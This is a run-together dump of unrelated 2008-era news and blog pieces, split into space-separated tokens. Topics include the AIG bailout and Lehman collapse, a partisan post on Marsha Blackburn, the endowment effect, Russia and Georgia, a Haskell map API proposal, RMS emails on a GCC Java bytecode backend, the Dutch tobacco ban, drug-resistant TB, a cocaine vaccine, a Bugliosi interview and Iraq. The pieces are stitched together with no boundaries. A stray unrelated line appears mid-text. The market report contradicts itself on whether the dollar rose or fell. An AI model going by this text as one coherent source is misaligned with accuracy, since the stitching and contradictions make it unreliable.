According to the Stock Trader 's Almanac , September has traditionally been the worst month for the Dow and S&P 500 since 1950 , with the Dow averaging a loss of 1 % during the month and the S&P 500 losing 0.6 % .
September has also been the worst month for the Nasdaq since its inception in 1971 , averaging a loss of 0.9 % .
By comparison , as of Wednesday 's close , the Dow is down 8.1 % and the S&P 500 is down 6.4 % in September , while the Nasdaq has fallen 11.3 % month - to - date .
Year - to - date , all three major gauges are down more than 20 % .
Bonds rallied , lowering the corresponding yields , as investors sought the comparatively safe haven of government debt .
The dollar tumbled versus the yen and euro .
Oil prices gained $ 6.01 a barrel and gold prices soared $ 70 an ounce .
AIG : The Fed said late Tuesday that it was extending a two - year , $ 85 billion bridge loan to the troubled insurer in exchange for a stake in AIG that could reach 80 % .
AIG will have to pay back the loan in full by selling off some of its assets .
AIG had been on the verge of collapse as it scrambled to raise cash in the aftermath of the subprime mortgage collapse and subsequent credit crunch .
AIG ( AIG , Fortune 500 ) shares plunged 45 % Wednesday .

Barclays and Lehman Brothers : Late Tuesday , Barclays said it will buy Lehman 's North American investment banking and capital markets businesses for $ 250 million in cash , as well as Lehman 's New York headquarters and two New Jersey data centers for $ 1.5 billion .
( Full story )
Barclays ( BCS ) had walked away from a deal to buy the troubled company outright over the weekend .
Bank of America ( BAC , Fortune 500 ) also walked away from a possible merger , and wound up buying Merrill Lynch ( MER , Fortune 500 ) in a $ 50 billion stock deal .
Unable to find a buyer , Lehman Brothers ( LEH , Fortune 500 ) filed for the biggest bankruptcy in history on Monday .
Although the government helped in trying to facilitate a deal for Lehman Brothers , it was reportedly unwilling to finance any buyout , as opposed to what it did with Bear Stearns in March and AIG .
The government 's reluctance to step in contributed to the reluctance of other banks to strike a deal with the troubled company .
( Full story )
The government reportedly helped AIG in order to prevent a bankruptcy that would have had broad implications for the U.S. and global markets .
By comparison , the Lehman fallout was seen as more contained .
The government is also reportedly helping to facilitate the deal for the purchase of Washington Mutual .
Any deal , however , would reportedly not include government financing .
Other movers : Declines were broad based , with all 30 Dow components ending lower , led by the financial shares .
Other big Dow losers included Boeing ( BA , Fortune 500 ) , General Electric ( GE , Fortune 500 ) , General Motors ( GM , Fortune 500 ) and Home Depot ( HD , Fortune 500 ) .
A variety of airline shares tumbled on the spike in oil prices , with higher fuel costs directly impacting airlines ' profits .
American Airlines ' parent AMR ( AMR , Fortune 500 ) slid 14 % , Continental Airlines ( CAL , Fortune 500 ) fell 14 % and JetBlue Airways ( JBLU ) lost 6 % .
Railroad and trucker stocks slipped too on the rise in oil prices .
The Dow Jones Transportation ( DJTA ) average fell 3.5 % .
Negativity persists :
The mood was pessimistic Wednesday , following late Tuesday news that the Fed was stepping in to help AIG avoid filing for bankruptcy - a development that could have caused massive turmoil within the already - strapped financial market .
But rather than reassure investors , the deal seemed to add to the uncertainty surrounding financial markets , coming six months after the near - collapse and government rescue of Bear Stearns .
" The whole thing is a mess , " said Kelli Hill , Portfolio Manager at Ashfield Capital Partners .
" When Bear Stearns collapsed , everyone thought that was the capitulation , but it was n't .
It 's ongoing . "
The fallout from the housing and credit market collapse " ripples through the entire financial industry and is stretching to other industries , " she said .
" The question everyone is asking is ' what 's going to fix this ? ' "
The news also seemed to tighten up credit markets , despite the Fed 's efforts to keep money flowing .
The Treasury Dept. said Wednesday that it would sell $ 40 billion of debt for the Fed to help the central bank deal with the huge cash crunch in the wake of the credit crisis .
But a key measure of borrowing costs surged to 1987 levels , Bloomberg reported , as the three - month treasury bill rates fell to multi- year lows .
The TED spread , which measures the difference between what the Treasury pays for three - month loans and what banks charge each other , surged to the highest level in more than 20 years .
A jump in the spread shows how panicky banks are , in that they are charging each other a bigger interest - rate premium than money lent to the U.S. government .
In other news , the Securities and Exchange Commission put into place new rules to limit so - called " naked " short - selling - a move aimed at soothing financial markets .
Short - selling refers to the process by which traders who have sold shares short to take advantage of a falling market need to buy them back .

Housing : Construction of new houses and apartments fell to their lowest level in 17 years last month , according to a government report Wednesday .
( Full story )
Fuel prices :
Oil prices rallied as investors eyed the developments on Wall Street and the falling dollar , which makes dollar - traded commodities like oil cheaper for foreign investors to buy .
The government 's mixed weekly inventories report was also in the mix .
U.S. light crude oil for October delivery rose $ 6.01 to settle at $ 97.16 after settling at a seven - month low on Tuesday .
( Full story ) .
Prices have plummeted since peaking at $ 147.27 a barrel on July 11 , as investors have bet that sluggish global growth will diminish oil demand .
Gas prices rose overnight , gaining for the 8th day in a row , according to a national survey of credit card activity .
Other markets :
In global trade , European markets ended lower and Asian stocks ended lower with the exception of the Japanese Nikkei .
Treasury prices rallied as investors sought safety in government debt , lowering the yield on the benchmark 10 - year note to 3.41 % from 3.49 % late Tuesday .
Treasury prices and yields move in opposite directions .
In currency trading , the dollar gained versus the euro and the yen .
COMEX gold for December delivery rallied $ 70 to settle at $ 850.50 an ounce .
We 've covered some of GOP Rep .
Marsha Blackburn 's follies over the past couple of years , and she 's given us plenty of chuckles .
Blackburn is big on Republican talking points , light on facts , and guaranteed to make you want to throw your teevee out the window -- so I was happy to see her speaking on behalf of John McCain 's campaign this afternoon .
During MSNBC 's coverage of Barack Obama 's economic speech today in North Carolina , Nora O'Donnell spoke with Blackburn about Obama 's criticism of the disastrous Bush / McCain policies and on the topic of high gas prices , Marsha did what any good Republican would do -- Blame Bill Clinton :
Download Download
" ... People are concerned about the economy and they 're concerned about gas prices , and in '95 it was President Clinton who vetoed drilling in Anwar .
If he had not done that , we would be seeing more gas in the pipeline right now .
So this is an issue I think that 's tailor made for John McCain . "
Oy .
Where to begin ?
The ANWR myth has been debunked , but Marsha was n't about to let those pesky facts get in the way .
Besides , it 's much better to blame Bill Clinton than take responsibility for your own party 's failures , right ?
Ah , guest articles .
Someone writes about drinking so we have some free time .
To drink .
It 's last call , the bar has been drained of all decent brand - name booze and these labels are presented to us on a menu .
Instead of taking a chance and actually drinking this cut-rate swill , we flag down a taxi and get the hell out of Dodge .
There ought to be a law against booze brand names this off - putting .

The cartoon of the winking , cleavage - bearing sexpot masseuse on the label indicates this was n't a case of someone having failed to check out the urban dictionary before naming the beer .
They were overtly using sexual double entendres and scantily clad women to appeal to horny men .

Why They Failed : Until we read the description on the label , " A huge , dry hopped stiffy , for a full - figured beer , resulting in an explosive finish ! "

I do something to things .
Let me pick up an ashtray from a dime - store counter , pay for it and put it in my pocket — and it becomes a special kind of ashtray , unlike any on earth , because it 's mine . ”
What was true of Wynand , one of the main characters in Ayn Rand 's novel “ The Fountainhead ” , may be true of everyone .
From basketball tickets to waterfowl - hunting rights to classic albums , once someone owns something , he places a higher value on it than he did when he acquired it — an observation first called “ the endowment effect ” about 28 years ago by Richard Thaler , who these days works at the University of Chicago .
The endowment effect was controversial for years .
The idea that a squishy , irrational bit of human behaviour could affect the cold , clean and rational world of markets was a challenge to neoclassical economists .
Their assumption had always been that individuals act to maximise their welfare ( the defining characteristic of economic man , or Homo economicus ) .
The value someone puts on something should not , therefore , depend on whether he actually owns it .
But the endowment effect has been seen in hundreds of experiments , the most famous of which found that students were surprisingly reluctant to trade a coffee mug they had been given for a bar of chocolate , even though they did not prefer coffee mugs to chocolate when given a straight choice between the two .
Moreover , it is now possible to see the effect in the brain .
In the June 12th edition of Neuron , Brian Knutson of Stanford University describes a brain - scanning study he carried out recently .
The pattern and location of the activity he observed suggests the endowment effect works by enhancing the salience of possible loss .
But that still does not explain why this sense of loss should be felt .
The question is whether such behaviour is truly irrational , or just “ differently ” rational .
That might be the case if , for instance , it was a hangover from the evolutionary past that worked then , but is no longer appropriate now .
Mug 's game
The endowment effect has nothing to do with wealth ( it is not as if chocolate bars and coffee mugs matter ) or transaction costs ( in most experiments these are zero ) .
Not even emotional attachment , whatever that means , can really be called in as an explanation , since the effect is both instantaneous and sometimes felt even by those who buy and sell for a living .
According to Pete Lunn , an economist at the Economic and Social Research Institute in Dublin , professional market traders are often reluctant to sell investments they already hold , even though they could trade them for assets they would prefer to invest in if starting from scratch .
Supposedly rational economists are affected , too .
Dr Thaler , who recently had some expensive bottles of wine stolen , observes that he is “ now confronted with precisely one of my own experiments : these are bottles I was n't planning to sell and now I 'm going to get a cheque from an insurance company and most of these bottles I will not buy .
I 'm a good enough economist to know there 's a bit of an inconsistency there . ”
The effect is not , however , universally observed .
Whereas coffee mugs generate an endowment effect , tokens that can be exchanged for coffee mugs do not .
And despite Dr Lunn 's observations , other work suggests professional traders can , and do , overcome the effect .
So what is going on ?
Owen Jones , a professor of law and biology at Vanderbilt University , and Sarah Brosnan , a primatologist at Georgia State University , suspect the answer is that , in the evolutionary past , giving things up , even when an apparently fair exchange seemed to be on offer , was just too risky .
These days , as they discuss in a paper just published in the William and Mary Law Review , there are contracts , rights and other ways of enforcing bargains .
Animal societies have none of these mechanisms .
As Adam Smith observed in the “ Wealth of Nations ” , “ nobody ever saw a dog make a fair and deliberate exchange of one bone for another with another dog . ”
To put flesh on their idea , Dr Jones and Dr Brosnan have been trying to overcome Smith 's observation by training chimpanzees to trade .
In 2006 Keith Chen of Yale University showed that capuchin monkeys could learn to do so , and also seemed to exhibit the endowment effect .
Chimps , it turns out , can manage to truck too .
In the chimp study , tubes of peanut butter and frozen juice bars were used .
Both treats were designed to be difficult to eat quickly .
This makes it possible for animals that would otherwise consume any food they were given at the first opportunity at least to consider the idea of an exchange .
When presented with a choice , 60 % of the chimps preferred peanut butter to juice .
However , when they were endowed with peanut butter , 80 % of them chose to keep it instead of exchanging it for juice .
It was as if the peanut butter became more valuable as soon as it was possessed .
And an opposite endowment effect was observed when the chimps were given juice .
Observing the endowment effect in three primate species suggests it does , indeed , have deep evolutionary roots .
Better still , before they started work Dr Jones and Dr Brosnan predicted that the strength of the effect would vary with the evolutionary salience of the item in question .
Lo and behold , when they tried the same experiments using bone and rope toys , no endowment effect was seen .
Food is vital .
Toys are not .
If the endowment effect does indeed vary according to evolutionary salience , this may make sense of the disparate results of hundreds of studies on people .
But it does raise the question of what is and is not evolutionarily salient .
Food and mates clearly are .
Tangible goods such as mugs , as opposed to abstract goods such as vouchers for mugs , probably are too .
But intangible possessions , such as shareholdings , do generate some effect , so physical presence cannot be all there is to it .
Steffen Huck , an economist at University College , London , has an alternative hypothesis that is directly to do with trade .
In societies with markets , customers can go elsewhere .
But in a small , tribal society there may be no alternative seller .
In that case , those who were reluctant to trade might get better prices .
It may thus make sense for an owner to be psychologically predisposed to hold out for a high price as soon as someone else expresses interest in one of his possessions — something Dr Huck 's models predict would , indeed , be evolutionarily beneficial .
Keep on trucking
Because the endowment effect touches on so many areas , Dr Jones thinks it may be helpful for legislators to understand its evolutionary origins .
That goods and rights such as pollution permits , radio spectrum and mobile - telephone licences do not inexorably flow towards the most efficient distribution worries the legal scholars charged with designing fair allocations .
The effect also complicates the negotiation of contracts , as people demand more to give up standard provisions than they would have been willing to pay had they bargained anew .
Nor is the endowment effect alone in suggesting that Homo economicus is a rarer species than neoclassical taxonomists would like to believe .
Other “ irrational ” phenomena include confirmation bias ( searching for or interpreting information in a way that confirms one 's preconceptions ) , the bandwagon effect ( doing things because others do them ) and framing problems ( when the conclusion reached depends on the way the data are presented ) .
All in all , the rational conclusion is that humans are irrational animals .
Russian prime minister Vladimir Putin said today he suspected someone in the United States provoked the conflict in Georgia in an attempt to help a candidate in the US presidential election .
" It is not just that the American side could not restrain the Georgian leadership from this criminal act .
The American side in effect armed and trained the Georgian army , " Mr Putin said in an interview with CNN , part of which was broadcast on Russian state television .
" Why ... seek a difficult compromise solution in the peacekeeping process ?
It is easier to arm one of the sides and provoke it into killing another side .
And the job is done .
" ...
The suspicion arises that someone in the United States especially created this conflict with the aim of making the situation more tense and creating a competitive advantage for one of the candidates fighting for the post of US president . "
The crisis flared earlier this month when Georgia tried to retake by force its separatist province of South Ossetia and Russia launched an overwhelming counter - attack .
Russian forces swept the Georgian army out of the rebel region and are still occupying some areas of Georgia proper .
On Tuesday , Moscow announced it was recognising South Ossetia and another breakaway region , Abkhazia , as independent states .
The United States and Europe demand Russia respect a French - brokered ceasefire and withdraw all its troops from Georgia , including a disputed buffer zone imposed by Moscow .
The UN Security Council today refused to approve a request from representatives of two Georgian breakaway regions , which Russia has recognized as independent states , to address the council .
In recent months Russia has repeatedly asked the 15 - nation council to allow representatives of Georgia 's two separatist enclaves , to speak to the Security Council but Western council members have reacted coolly .
However , the situation has became more complicated since Russia formally recognized South Ossetia and Abkhazia as independent countries .
" There was no unanimous support to respond positively to these requests now , " Belgium 's UN Ambassador Jan Grauls told reporters after a closed - door meeting .
Meanwhile European Union leaders are considering imposing sanctions against Russia ahead of a summit on Monday to discuss the situation in Georgia , French foreign minister Bernard Kouchner said today .
Asked about measures that could be taken against Russia at the summit , Mr Kouchner said : " Sanctions are being considered " .
He gave no details .
Russian Foreign Minister Sergei Lavrov said any sanctions imposed on Russia would be the product of a " sick imagination " and Western confusion .
" Apart from that my friend Mr Kouchner also said that we will soon attack Moldova and Ukraine and the Crimea ...
But that is a sick imagination and probably that applies to sanctions as well , " Lavrov told reporters ..
Earlier , Russian president Dmitry Medvedev told his French counterpart Nicolas Sarkozy that Georgian troops must return to their barracks in line with a French - brokered ceasefire , the Kremlin said today .
A Kremlin statement said Mr Medvedev and Mr Sarkozy spent more than an hour discussing the Georgian crisis by telephone .
Mr Sarkozy 's office did not immediately release an account of the conversation .
" The Russian side has stressed the need for Tbilisi to carry out point four of the Medvedev - Sarkozy plan , under which all Georgian troops should be returned to their original bases , " the Kremlin said in its account of the conversation .
" Mr Medvedev and Mr Sarkozy also discussed additional agreements , which may in future ensure safety in the areas near the borders of South Ossetia and Abkhazia , " it continued .
It did not say when the conversation took place , or on whose initiative .
France has joined other Western states condemning Russia 's recognition of South Ossetia and Abkhazia .
Yesterday , German chancellor Angela Merkel said she had condemned Russia 's behaviour in a telephone conversation with Mr Medvedev and demanded a speedy pullout from Georgia .
However , Russian foreign minister Sergei Lavrov told reporters Ms Merkel had made no such statement and described the conversation between Mr Medvedev and the German Chancellor as " constructive " .

Well this is the potential difficulty .
In general ( assuming the search succeeds ) it will not be known whether or not to delete , replace or leave alone until after the current associated value has been obtained .
So you need something like this .
You could get away without the LeaveAlone constructor I guess ( I.E. just use Maybe ) , but this wo n't allow the " leave the entire tree alone " option ( this is basically what the current alter function does ) .
What I have in mind is something very simple .. --
An " Open " map ( abstract data type ) data OMap k a -- O ( log n ) .
Open a Map at a the supplied current key openMap :: Ord k => k ->
Map k a -> OMap k a -- O ( 1 ) .
Read the value associated with the current key .
-- Returns Nothing if the search failed when the OMap was created readOMap :: OMap k a ->
Maybe a -- O( log n ) .
Delete the association at the current key -- ( O( 1 ) if the search failed when the OMap was created ) deleteOMap :: OMap k a ->
Map k a -- O( log n ) .
Set a new associated value for the current key .
writeOMap :: a -> OMap k a ->
Map k a -- O ( 1 ) .
Close OMap , leaving the Map unmodified ( not strictly necessary ) closeOMap :: OMap k a -> Map k a -- O ( 1 ) .
Get the current key ( not strictly necessary ) readOMapKey :: OMap k a -> k
That should be all users need to implement whatever hybrid operations they want .
As to whether and how new values are calculated ( and if so how strictly etc .. ) is entirely up to them .

Following is a dialog I have had with RMS over the last few weeks .
The skinny of it is that RMS thinks having gcc both generate and accept as an input java bytecode allows folks to do nasty proprietary things with gcc so he's not interested in the backend for the jvm which I wrote 18 months ago ( and does n't think anyone else should be ) .
I have tried to explain that java bytecode ( especially the stuff I generate ) is not a good intermediate language ...
I 'll let the list handle it .

To : rms@ai.mit.edu Subject : java backend Hi . I dont know if you remember me but I worked on a java bytecode backend to gcc which was released early last year .
At the time I was instructed that it would be impossible to get the copyright on the backend assigned to the FSF .
I would like to try again to obtain the copyright assignment as the ownership of this code is no longer a priority to the university that I was working for at the time .
As far as I know gcc does not currently support the generation of java bytecode [ if this is incorrect I would love to know where I can read more about it ! ] .
Since the release of this backend I have constantly received email from interested parties wishing to compile c / c++ to the java virtual machine .
An addition of a java bytecode target to gcc would facilitate this if I reason correctly .

Subject : Re : java backend
If it is possible to compile languages such as C into Java byte codes , I see a great danger .
The danger is that people will use Java byte codes to hook GCC up to proprietary back ends and proprietary front ends .
They could also generate Java byte codes , run a proprietary optimizer , and feed the result back into GCC .
In effect , the support for Java byte codes would undermine the goals of the GPL .
If your changes really do make such activities much easier , more feasible in practice , then I think it would have been better if you had never implemented the feature .
And now it would be better now if you take these changes off your web site , and do n't mention that they exist .
Of course , someone else really determined could redo the work , the extra burden of doing so might dissuade people from trying .
Did we discuss this previously ?
I do n't remember , because my memory is not as good as it was .
If we did , I will search for the old mail .

Subject : Re : last reply
To me it appears that you believe java bytecode is an intermediate language , and compiling to an intermediate language is not the goals of gcc because it is possible to write proprietory code that uses the intermediate language .
That is right .
More precisely , I see that it could be used as an intermediate language -- and that GCC might be equipped with code both to write it and to read it .
386 assembler code could also in theory be used as an intermediate language , but ( 1 ) it would be far more cumbersome and ( 2 ) nobody is writing code for GCC to * read * this language .
These two obstacles can certainly in principle be overcome , but that would take work , and the work makes it unlikely .
There 's a big practical difference between " You could do it inconveniently if you add a lot of other features first " and " You can do it conveniently today , since we give you everything you need to get started . "
One thing I am not certain of .
I think I recall that the Java front end for GCC can easily read in Java byte codes and compile them .
Can you tell me for certain if that is true ?

The firm , Bragg Associates , calculated the odds of the candidates dying in office , adjusted for their known health problems .
McCain would be the oldest president to begin a first term in office .
By the end of a second term , Jan. 20 , 2017 , he would have a 24.44 percent chance of dying , compared with 5.76 percent for Obama , the firm estimates … .

The sensation caused by the descent of the uterus into the pelvic cavity before the onset of labour
July 1 , 2008  -- A
Dutch ban on cigarette smoking in public places takes effect today , but people still will be able to light up in the country 's cafes — as long as they are smoking pot .
The nationwide tobacco ban is intended to protect workers from secondhand smoke in bars , cafes and restaurants .
Even the country 's 700 - plus coffee shops , where marijuana smoking is tolerated , will be subject to the no-tobacco rule .
" It would have been wrong to move towards a smoke - free catering industry and then make an exception for coffee shops , " Dutch Prime Minister Jan Peter Balkenende told Dutch TV station NOS .
" People would not have understood that . "
So , does that mean you can still sit in a cafe and smoke a joint ?
" In theory , yes , " Dutch Health Minister Ab Klink told lawmakers earlier this year .
" Smoking can continue at the shops for as long as no tobacco is in the mix . "
He added , " Those who prefer to accent their marijuana high with a bit of tobacco as well will have to go outside or to separate tobacco - smoking rooms .
The alternative will be going - tobacco free , as the ban seeks , by smoking marijuana alone . "
Coffee shop owners have been unsuccessful arguing against the no-tobacco ban , trying desperately to get special provisions approved .
They will be held responsible and fined if a customer is caught smoking a tobacco - based joint .
De Tweede Kamer , a small , well - known coffee shop in the heart of Amsterdam , has been in business for more than 24 years and is frequented on most days by 250 to 300 customers .
Jason den Enting , the manager , told ABC News in a telephone interview , " This is absurd .
Our customers come here to socialize and smoke .
Smoking has to be allowed in a coffee shop , it 's a cultural thing . "
He explains that customers must be 18 years old , adding , " At age 18 , people are old enough to vote and they are mature enough to go to war for our country , so why are they not deemed mature enough to decide themselves whether or not they want to smoke ? "
" The other side of the coin are the staffers , working at the cafes , [ who ] are meant to be protected from secondhand smoke , " he said .
" But that point is moot ; it is entirely up to the employee whether he wants to work at a coffee shop . "
Coffee Shop Culture in Amsterdam
Each year some 4.2 million tourists from all over the world visit Amsterdam .
While most of them come here for the well - known tourist attractions — the canals , the museums , the historic buildings — others come to enjoy the country 's relatively hassle - free drug policy , which has led to a division in the eyes of the law between " hard " drugs , such as cocaine or heroin , and " soft " drugs , like cannabis .
Technically , cannabis is an illegal substance .
However , a policy of tolerance allows customers to have a joint at specially licensed cafes called coffee shops , so long as the amount sold to one person per day is limited to 5 grams .
Coffee shops are allowed to stock a maximum of 500 grams .
The coffee shops have to adhere to strict criteria .
They must be licensed , and they are prohibited from selling soft drugs to minors under 18 .
Advertising or promotion of drugs is strictly banned .
Now , the license can be confiscated if the owner is found not to adhere to the new no - tobacco rule .
In April 2007 , coffee shops were forced to choose between serving alcohol and cannabis .
The vast majority opted to serve cannabis .
Cannabis is usually mixed with tobacco and rolled in a joint , but it can be smoked in a pipe or it can also be consumed as a tea or in cake form .
Is Business Expected to Plummet ?
Jason den Enting has been managing the Tweede Kamer for more than six years without any problems .
He said that his European customers are the ones to be most affected by the new rule .
" Our guests from America are usually the ones to smoke marijuana pure or in a pipe .
They 're more used to that than our clients from here .
Our local patrons traditionally prefer their cannabis joints mixed with tobacco , because it is n't that strong then . "
Asked whether he expects business to plummet , den Enting said , " I do n't think so , but it might be less fun in the future .
" So far , " he said , " we 're taking pride in providing a convivial atmosphere , We do n't want to become a drug takeaway .
Our guests like to come here for the social contacts , chatting with each other , reading newspapers or talking about politics .
" Now , " he said , " that atmosphere is likely to be destroyed by an absurd decision . "
TB is caused by infection with Mycobacterium tuberculosis Tuberculosis which is resistant to many current treatments can be overcome with aggressive therapy , research suggests .
Extensively drug- resistant TB is associated with high rates of mortality and is thought to account for at least 7 % of cases of the infection worldwide .
Despite fears that it is untreatable , researchers have shown a cure is possible with a combination of at least five drugs , The Lancet reported .
UK experts said it was good news but would require a lot of resources .
Multi - drug resistant ( MDR ) TB , of which there are around 50 to 70 cases every year in the UK , is resistant to the most commonly used treatments isoniazid and rifampin .
It 's a very important paper showing it 's possible to deal with XDR -TB
Dr John Moore - Gillon
But in extensively resistant ( XDR ) TB , at least two of the second - line treatments are also worthless .
Some experts have speculated that XDR - TB is effectively untreatable and there were grave concerns after reports of 52 deaths in 16 days in South Africa after an outbreak among patients with HIV .
Tailored treatment
In the latest trial done in 600 patients in Russia with resistant TB , researchers found that almost 5 % of them had XDR - TB .
Each patient was given an individually tailored treatment programme on the basis of the strain they had .
The aim was to provide at least five drugs to which that particular patient 's strain of TB was susceptible .
Almost half of XDR - TB patients and 67 % of MDR - TB patients had treatment cure on completion .
Study leader Dr Salmaan Keshavjee , from Harvard Medical School in the US , said : " Aggressive management of this infectious disease is feasible and can prevent high mortality rates and further transmission of drug - resistant strains of TB . "
Dr John Moore - Gillon , a spokesperson for the British Lung Foundation , said the bad news is that we have XRD - TB in the first place .
" The reason we have the problem is inadequate control of TB .
" This treatment is extremely labour and resource intensive and has to be done within extremely well structured TB programmes .
" It 's a very important paper showing it 's possible to deal with XDR - TB but it 's very expensive . "
He added that MDR - TB treatment costs tens of thousands but for XDR - TB it 's " much more than that " .

What are these ?
The developments , reported in New Scientist magazine , come after tests by American drug expert Thomas Kosten on a group of more than 100 cocaine addicts keen to kick the habit .
Some participants in the trial were administered with antibodies designed to counteract the effects of the drug and were effectively " vaccinated " against cocaine .
By the end of the trial , in which addicts received five injections of the vaccine over 12 weeks , those who relapsed in their fight to give up the drug simply wasted their money when they took an ineffective " hit " .
Many were reportedly keen to continue taking the vaccine after the trial but were prevented because the drug has not been approved for distribution in the US .
A year on , Professor Kosten estimated that all who had kicked the habit during the trial were " using " again .
While Australia does not have anywhere near the cocaine problem of America , where more than 2 million people use the drug regularly , the trial has sparked interest in Australia for its potential to be used to fight methamphetamine addiction .
The National Drug and Research Centre estimates that one in 10 Australians has tried methamphetamine and about half a million Australian adults use the drug .
But Dr Wodak said any method of curbing drugs that required addicts to seek medical attention to tackle their problem was flawed .
" I am all in favour of having more options .
We have too few treatment options .
I certainly recognise that , " he said .
" But a minority of people with drug and alcohol problems see clinicians .
Only 8 per cent of people with drug and alcohol problem will go anywhere near a clinician in the next 12 months .
" I do n't want to downplay the significance of these people , I would not have a job if not for them , but I also want to make sure there are answers for the 92 per cent of people who never come to a clinician . "
Dr Wodak said Kosten 's product was a typical American attitude towards drugs .
" The Americans just do n't get it , frankly .
Drug addiction is a brain disease to these people , " he said .
" They have the worst drug problem in the world and they go around telling the rest of the world , particularly poor countries , how they should run their drug programs .
" What 's not mentioned is that a lot of the people using and selling cocaine live impoverished lives , they are often from minority populations and they use drugs like cocaine to make their miserable lives less miserable .
" Good luck to [ Kosten ] but that 's not the direction I would choose . "
Vincent Bugliosi talks about prosecuting George Bush and his appearance before the House Judiciary Committee appearance .
The Prosecution of George W. Bush for Murder is a call to action .
A man of 73 , in the wake of years spent creating his masterwork , 2007 's Reclaiming History about the Kennedy assassination , has constructed his case with the passion of an idealistic college student .
Surely the rest of us are capable of catching one last wave of Bush & Co. outrage .
We do want to see Bush brought to justice , do n't we ?
RW : On July 25 you appeared on a panel before the House Judiciary Committee with the likes of Dennis Kucinich and Elizabeth Holtzman to examine the " imperial presidency " of George Bush .
When you appeared at the Great Mind Series in Los Angeles , it was reported that you said of Committee Chairman John Conyers , " He 's completely behind what I 'm doing here . "
Do you think summoning you to speak was Conyers 's way of shifting attention from impeachment to a process with a better chance of success ?
VB : Conyers called me up and said he read the book and liked it very much .
This was before there was any mention of the hearing .
Then I got the invitation .
So I spoke to his assistant and I said I 'm not an authority on impeachment .
I 'm only talking about prosecuting George Bush for first - degree murder .
Everyone there was talking about one of two things : executive power and constitutional limitations or impeachment , and I was talking about murder .
So they knew in advance .
Though they did n't say it , they may have expanded the hearings for me .
I 'm just saying that I told them that I was not coming back there [ to Washington from L.A. -- Ed. ] to talk about the subject matter of the hearings .
Although , certainly , if you 're talking about the basis for impeachment -- high crimes and misdemeanors -- murder obviously qualifies as one .
They may have very well felt that what I was saying obviously did apply .
I tried to simplify for the hearing .
I did n't have much time .
The difficulty always is it takes more time to figure out how to convey your message when you only have a short period of time .
[ Here Bugliosi cites the famous saying attributed to either Pascal , Voltaire , or Mark Twain : " I did n't have time to write a short letter , so I 've written a long one instead . " –- Ed. ]
They 're telling me I 've got five minutes -- tell me what 's in your book in five minutes .
It took me more time to figure out how I was going to do that then if they said I had a half hour .
I tried to compress it into five minutes , which was not easy at all .
But I got some good stuff in there .
I want to make it very clear .
I definitely believe that Bush should be impeached .
There 's no question about that .
It 's just that I 'm not satisfied with impeachment , him not spending one day in the county jail , continuing to enjoy himself .
I do n't see any real justice there .
But impeachment is n't too likely because of a couple of things :
One , the time element .
Two , Nancy Pelosi , doing what Democrats do so well , is not in favor of impeachment and she 's the speaker .
That makes it almost insurmountable when you have the speaker against it .
Three , impeachment would be good even if it 's not successful .
Anything to stain the record of this terrible human being .
You can't get a conviction on impeachment because you need two - third vote of the Senate and , as you know , the Senate is evenly divided between Republicans and Democrats .
Still , I 'd like to see an impeachment at least .
But the notion that would be enough for what he did is something that I do n't agree with .
RW : You 're not working in opposition to Congressman Kucinich , who introduced articles of impeachment against Bush , are you ?
VB : No , absolutely not .
I agree with everything Dennis says .
But , again , impeachment alone is too good for George Bush .
RW : You also said to the Judiciary Committee : " It would greatly dishonor those in their graves who paid the ultimate price because of this war were you not to refer this case to the Department of Justice . "
Does the go - ahead for a prosecution start with Conyers and his committee ?
VB : No , it does n't start there .
This is just one way to get this case going and it's the least likely .
If they did it , then a criminal investigation would commence .
The attorney general in Washington DC , that would be the best way .
If anyone does anything –- I have to be candid with you –- it 's unlikely that any one of the 93 federal attorneys would begin criminal proceedings without getting the consent of their boss in Washington , the attorney general .
And that 's why , realistically , on a federal level , there is only one person who would ever bring criminal charges against Bush and that 's the attorney general .
I want to point out that the burden that has to be met when referring a case to the attorney general 's office is very low .
All that 's required is that there be a quote reasonable unquote suspicion that a crime has been committed .
Surely , there 's a reasonable suspicion here that Bush took this nation to war under false pretenses .
The attorney general 's office can't prosecute him now but they can commence the investigation immediately .
Then once he leaves office , at that point they can file charges .
But there 's only one attorney general and it's a highly politicized office .
Part 1 . Part 3 tomorrow .

Colin Kahl , just back from Iraq , gave a briefing that Gareth Porter attended .
He reports that :
1. US officials in Baghdad are genuinely worried that Prime Minister Nuri al - Maliki has become “ over - confident ” about his military capabilities and has therefore become unreasonably difficult to deal with over the proposed status of forces agreement on the rules governing US troops in Iraq .
( Al - Maliki appears to have won some internal battles in the Iraqi government in the past six months , so that he now firmly controls the intelligence apparatus and has military operations centers under his authority throughout the country ) .
2. Al - Maliki is not only refusing to incorporate the Sunni Arab Awakening Councils or “ Sons of Iraq ” into the Iraqi security forces , but may actually be planning to make war on them .
These are Sunni Arab militias , many former Salafi or nationalist guerrillas , who have agreed to take a salary from the US and to fight the Qutbist vigilantes ( ‘ al - Qaeda in Iraq ’ ) :
‘ Kahl said in the briefing that , of the 103,000 Sunnis belonging to those militias , the Iraqi government had promised to take into the security forces only about 16,000 .
But in fact , it has approved only 600 applicants thus far , according to Kahl , and most of those have turned out to be Shi ’a rather than Sunni militiamen . ’
[ I ’ve also been told by knowledgeable Iraqi Shiites that the Awakening Councils are the biggest threat Baghdad faces and that when the Americans are weaker in Iraqi it will be necessary to “ take care of them . ” )
3 . Bush is so done out with al - Maliki ’s obstreperous stance on restrictions on US troops and his demand for a withdrawal timetable that he sharply warned al - Maliki that without a SOFA he would have to pull out US troops by Jan. 1 , 2009 .
( US troops operating in Iraq with no agreed legal framework would be constantly open to murder and other serious legal charges ) .
4. Muqtada al - Sadr agreed to a ceasefire last September and is turning his Mahdi Army into a civilian social - work force under strong Iranian pressure .
The Iranians seem to be convinced that the Mahdi Army was becoming a pretext for the US to stay in Iraq ( and of course the Bushies were blaming Iran for everything Muqtada did ) .
( Kahl did not note , but I want to , that Iran is mainly allied with Abdul Aziz al - Hakim and his Badr corps paramilitary , which has become the backbone of al - Maliki ’s security forces ;
Iran thus has multiple reasons for trying to get rid of the Mahdi Army as a military force ) .
Question :
Is there a third reason Iran pressured al - Sadr on this matter ?
Is there a secret , informal agreement between Bush and Khamenei that if the Mahdi Army quietens down , the US will talk to Iran , will refrain from bombing the nuclear facilities at Natanz , and will forestall an Israeli attack , as well ?
Just speculation on my part– I ’m not asserting , just wondering .
Kahl ’s information is another challenge to the idea that the “ Surge ” “ worked . ”
Among the things that “ worked ” were Iran becoming even more influential in Iraq and al - Maliki getting hold of his own government .
Shorter LAT : Georgia and other allies with relatively large , effective troop contingents in Iraq are leaving , which probably makes it difficult for the US to draw down its troops at the rate Gen .
David Petraeus originally envisioned for this year .
